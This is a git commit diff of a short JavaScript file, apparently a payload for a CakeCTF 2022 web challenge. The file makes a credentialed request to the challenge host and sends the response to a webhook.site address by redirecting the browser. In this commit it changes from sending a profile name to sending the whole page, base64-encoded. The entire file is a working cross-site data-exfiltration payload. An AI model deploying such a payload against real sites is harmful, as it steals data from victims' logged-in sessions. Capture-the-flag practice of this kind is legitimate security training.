d492558440e1ef2a47f7a6fe5250a8f53ed3adef
YoneD19 <53221480+YoneD19@users.noreply.github.com>
2022-09-06 10:07:14 +0700

    Update and rename ok4.js to ok5.js

--- ok5.js
+++ ok5.js
@@ -2,8 +2,8 @@ var r = new XMLHttpRequest();
 r.open("GET", "http://web1.2022.cakectf.com:8003/", true); 
 r.onreadystatechange = function() { 
     if (r.readyState == 4){
-        var res = r.response.split('\'s Profile')[0].split('<h1>')[1].replace(/\s/g, '');
-        window.location = 'https://webhook.site/5714e407-e06e-49ba-a7fc-bff2e30c2104/q=' + res;
+        var res = r.response;
+        window.location = 'https://webhook.site/5714e407-e06e-49ba-a7fc-bff2e30c2104/q=' + btoa(res);
     }
 };
 r.withCredentials = true;
